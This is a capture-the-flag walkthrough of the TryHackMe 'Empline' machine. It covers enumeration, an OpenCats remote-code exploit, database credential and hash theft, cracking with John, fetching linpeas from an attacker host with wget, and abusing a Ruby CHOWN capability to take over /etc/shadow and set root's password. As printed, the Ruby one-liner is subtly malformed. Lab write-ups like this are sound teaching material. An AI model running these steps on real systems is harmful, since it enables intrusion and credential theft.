## Objective
The challenge is called [Empline](https://tryhackme.com/room/empline). The goal is to compromise the provided machine.
## Information Gathering
We start with the following information:
- **Target machine IP**\*: `TARGET_IP`
- **Attacker machine IP**: `ATTACKER_IP`.

*\*Note: this IP may change due to resets of the target machine.*

We start by enumerating the services exposed by the machine with `nmap`:

![415e14fb34e3478e5bdbd117219f1c42.png](../_resources/415e14fb34e3478e5bdbd117219f1c42.png)

We scan the machine with SYN scan (`-sS` option), without resolving DNS (`-n` option) and probing all TCP ports from 1 to 10000 (`-p1-10000` option). We get the following open ports:

- 22;
- 80;
- 3306;

We can further enumerate the found ports to try to identify the version of the services (`-sV` option) and run `nmap` default scripts (`-sC` option):

![5ec15a0e841629f964dc307706404fd1.png](../_resources/5ec15a0e841629f964dc307706404fd1.png)

We find out that on port `80`, as expected, the machine hosts a website.
From the scripts run on port `3306` we can guess that the machine OS is Linux.

We visit the website in our web browser:

![362972dbd1bae147d84c7cf387f2b6b1.png](../_resources/362972dbd1bae147d84c7cf387f2b6b1.png)

The hyperlink *Employment* redirects to http://job.empline.thm/careers. Before we can access that link, we need to update our `/etc/hosts` file in order to associate the domain name with the target IP:

![ae85972e472ca036adefa17e45614103.png](../_resources/ae85972e472ca036adefa17e45614103.png)

Besides, we can further enumerate the website for potentially exposed folders with `gobuster`:

![f727bc26e6b825b6e3a9e91eb336efab.png](../_resources/f727bc26e6b825b6e3a9e91eb336efab.png)

It doesn't return any relevant information. By running `gobuster` to find other potentially hidden virtualhosts, we don't get any further information either:

![dac2835aee77f981537f9ad5e10bb26c.png](../_resources/dac2835aee77f981537f9ad5e10bb26c.png)

## Exploitation

The *Employment* hyperlink directs us to the following page, that runs a web application called **OpenCats**:

![9047fd6a6a005cb3225163df7c5bd00a.png](../_resources/9047fd6a6a005cb3225163df7c5bd00a.png)

We can search for known exploits with `searchsploit opencats` for the application and we find two:

![533f547311a04119a6bc9c77d5c20ac1.png](../_resources/533f547311a04119a6bc9c77d5c20ac1.png)

The first exploit looks promising, since it allows us to get RCE. We download it with `searchsploit -m 50585`:

![35308b132810e0bf2a7d20bc0fd3cba1.png](../_resources/35308b132810e0bf2a7d20bc0fd3cba1.png)

We set its permission to executable (`chmod +x 50585.sh`), we run it and we get a shell:

![34ea5111df12fc9fa147b9c3fcec1d2e.png](../_resources/34ea5111df12fc9fa147b9c3fcec1d2e.png)

We run the comman `whoami` and detect that we are the user `www-data`:

![232a9f34216706e9860db669aefaa50b.png](../_resources/232a9f34216706e9860db669aefaa50b.png)

## Mantaining access

We look around to try to find potential privilege escalation vectors. We list the contents of directory `/home` and we find two users:

![7082b47fbec58926f12fb36cc3c2f3e7.png](../_resources/7082b47fbec58926f12fb36cc3c2f3e7.png)

In the `/var/www/opencats/` folder we find a configuration file named `config.php`:

![87409309f6123c1ec6c017af781a6d79.png](../_resources/87409309f6123c1ec6c017af781a6d79.png)

If we read this file with `cat /var/www/opencats/config.php` we find some credentials for a database:

![53635aca90b2dc219bb228394e178ed5.png](../_resources/53635aca90b2dc219bb228394e178ed5.png)

The credentials are `james:PASSWORD` (just a placeholder used in this writeup instead of the real password) and the database name is `opencats`. We can use this information to connect to the MySQL service with `mysql -u james -p'PASSWORD' -D opencats -h 10.10.83.205`:

![c94ca171cd4950b8c4ad989f166ec6ea.png](../_resources/c94ca171cd4950b8c4ad989f166ec6ea.png)

The connection is successful. In the newly acquired SQL shell we run the command `show tables;` to view all the tables in the current database; the table `user` seems interesting.

![3dfca7357bf13a0fba13344163d24613.png](../_resources/3dfca7357bf13a0fba13344163d24613.png)

We can see the column names of the table with `describe user;`:

![50860f1117332f513fb24636d64bb611.png](../_resources/50860f1117332f513fb24636d64bb611.png)

The fields `user_name` and `password` look interesting, so we can retrieve these information with a simple `SELECT` statement: `select user_name,password from user;`:

![1eedc8af7ed8295a9e48644d15a4021f.png](../_resources/1eedc8af7ed8295a9e48644d15a4021f.png)

We get four users. With a simple Google search we can find out that OpenCats stores the MD5 hash of the passwords. We can verify this by calculating the MD5 hash of the password that we got for the user `james`. Running the simple command `echo -n "PASSWORD" | md5sum` gives us the same result stored in the database, therefore the MD5 hashes are used:

![e10070e3b53541bdb2c9844f966f829a.png](../_resources/e10070e3b53541bdb2c9844f966f829a.png)

We can try to get the plain text password using John the Ripper. We save the hashes in a file (in the screenshot below only the hash of user `george` is saved) and try crack it using the `rockyou.txt` wordlist.

![38bc811cb8cb71eb6307866e45a93e18.png](../_resources/38bc811cb8cb71eb6307866e45a93e18.png)

We get the password `GEORGE_PASSWORD` (just a placeholder used in this writeup instead of the real password). We can now try to elevate our privilege by loggin in by SSH with the user `george` and the found password: `ssh george@TARGET_IP`. We get a shell:

![c8215a0165667f50faa6a68cd2cdb214.png](../_resources/c8215a0165667f50faa6a68cd2cdb214.png)

We find the user flag in the home directory: `cat user.txt`:

![9f47aae895104a5ce1d5ed5500182e46.png](../_resources/9f47aae895104a5ce1d5ed5500182e46.png)

Now we can try to elevate our privileges to `root`. To find possible privilege escalation vectors, we can run `linpeas.sh`. In order to get it on the target machine, we host a simple Python server on the attacker machine with `sudo python -m http.server 80` in the folder where `linpeas.sh` is stored:

![3c80dcd783239b9bbf530b15e2722edc.png](../_resources/3c80dcd783239b9bbf530b15e2722edc.png)

Then, on the SSH session, we download it with `wget http://ATTACKER_IP/linpeas.sh` and we execute it with `/bin/sh linpeas.sh`. The script finds, among many things, the following interesting setting:

![6cf4099d6c20a8d352f5a41c0c98a539.png](../_resources/6cf4099d6c20a8d352f5a41c0c98a539.png)

It means that `ruby` has the CHOWN capability, that means that it can change files ownership. We can abuse this capability to get root access.

The idea is to modify `root` password in order to set one of our choosing. In order to do that, we need permission to modify the `/etc/shadow` file, which is where the hashes of the password are stored. We can abuse the `ruby`  capability to do that with the command `ruby -e "require 'fileutils'; fileutils.chown 'george' 'george' '/etc/shadow'"`. We can now print the first line of the file, which means that its owner is now `george`:

![0327e68befa4004b503d6479cd1caab5.png](../_resources/0327e68befa4004b503d6479cd1caab5.png)

Now we compute the hash of the password `password`, that is the password that we want to assign to the `root` user.
![590ef9b2ac144dbdecd65604c3e33091.png](../_resources/590ef9b2ac144dbdecd65604c3e33091.png)

We now modify the `/etc/shadow` file with an inline editor like `vim` replacing the old hash with the new hash value.

Finally, we can login as `root` with the password we set, i.e. `password` and get the flag `root.txt`.

![68110b1fbb7368428705ba6900b8db10.png](../_resources/68110b1fbb7368428705ba6900b8db10.png)